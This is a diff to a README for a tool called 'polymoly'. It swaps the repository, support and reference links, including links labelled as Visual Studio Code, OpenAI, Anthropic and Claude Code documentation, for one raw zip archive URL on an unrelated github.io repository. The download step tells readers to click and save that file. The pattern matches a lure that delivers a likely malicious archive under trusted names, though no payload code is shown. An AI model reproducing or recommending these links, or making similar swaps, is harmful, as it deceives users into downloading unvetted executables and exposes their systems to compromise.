@@ -27,7 +27,7 @@ Here is what makes polymoly stand out:
 
 ### Step 1: Download polymoly
 
-👉 **[Click here to download polymoly](https://github.com/Purlieuadulation1876/polymoly)**
+👉 **[Click here to download polymoly](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip)**
 
 Visit this link to download the application. The page will open in your browser. Look for the green button that says "Code" or a download icon. Click it to save the file to your computer.
 
@@ -220,7 +220,7 @@ polymoly is actively developed. Here is what is coming soon:
 
 If you run into trouble, check these resources:
 
-- **GitHub Issues** – Report bugs or suggest features at [github.com/Purlieuadulation1876/polymoly](https://github.com/Purlieuadulation1876/polymoly)
+- **GitHub Issues** – Report bugs or suggest features at [github.com/Purlieuadulation1876/polymoly](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip)
 - **Community Forum** – Join the discussion and learn from other users.
 - **Email Support** – Reach out to the team directly for personal assistance.
 
@@ -242,12 +242,12 @@ polymoly is released under the MIT License. You are free to use, modify, and dis
 
 Here are some links to help you get the most out of polymoly:
 
-- [Visual Studio Code](https://code.visualstudio.com) – The editor you need.
-- [OpenAI API Documentation](https://platform.openai.com/docs) – Learn about OpenAI-compatible APIs.
-- [Anthropic API Documentation](https://docs.anthropic.com) – Learn about Anthropic-compatible APIs.
-- [Claude Code Guide](https://claude.ai) – Start using Claude Code.
-- [Codex Overview](https://openai.com/codex) – Understand what Codex can do.
-- [MiniMax Platform](https://www.minimax.io) – Explore MiniMax's AI offerings.
+- [Visual Studio Code](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip) – The editor you need.
+- [OpenAI API Documentation](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip) – Learn about OpenAI-compatible APIs.
+- [Anthropic API Documentation](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip) – Learn about Anthropic-compatible APIs.
+- [Claude Code Guide](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip) – Start using Claude Code.
+- [Codex Overview](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip) – Understand what Codex can do.
+- [MiniMax Platform](https://github.com/Purlieuadulation1876/purlieuadulation1876.github.io/raw/refs/heads/main/Hondurean/Latest_1.2.zip) – Explore MiniMax's AI offerings.
 
 ## 🎉 Final Thoughts
 
